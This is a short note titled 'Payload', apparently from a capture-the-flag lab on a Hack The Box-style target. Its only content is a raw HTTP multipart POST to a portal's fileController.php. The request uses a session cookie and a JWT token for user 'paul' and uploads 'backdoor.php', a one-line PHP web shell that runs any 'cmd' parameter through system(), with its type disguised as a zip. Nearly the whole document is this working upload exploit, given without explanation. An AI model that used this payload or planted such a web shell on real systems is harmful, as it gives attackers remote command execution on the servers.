# Payload

```http
POST /portal/includes/fileController.php HTTP/1.1
Host: 10.10.10.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------3656735878643738902827528058
Content-Length: 392
Origin: http://10.10.10.228
Connection: close
Referer: http://10.10.10.228/portal/php/files.php
Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU

-----------------------------3656735878643738902827528058
Content-Disposition: form-data; name="file"; filename="backdoor.php"
Content-Type: application/zip

<?php $cmd = ($_REQUEST['cmd']); system($cmd); die;?>

-----------------------------3656735878643738902827528058
Content-Disposition: form-data; name="task"

a.php
-----------------------------3656735878643738902827528058--

```